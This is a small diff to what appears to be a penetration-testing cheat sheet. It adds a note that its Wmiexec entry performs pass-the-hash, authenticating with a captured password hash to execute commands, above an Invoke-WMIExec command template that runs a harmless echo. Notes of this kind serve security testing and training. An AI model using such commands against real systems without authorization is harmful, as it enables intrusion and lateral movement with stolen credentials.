@@ -24,6 +24,7 @@ hash-identifier <hash>
 ```
 
 **4. Wmiexec**
+Pass-to-hash, using hash to authen and execute command or access cmd
 ```
 Invoke-WMIExec -Targt <IP> -Domain <domain> -Username <user> -Hash <hash> -Comand 'cmd /c"echo hello_world"'
 ```
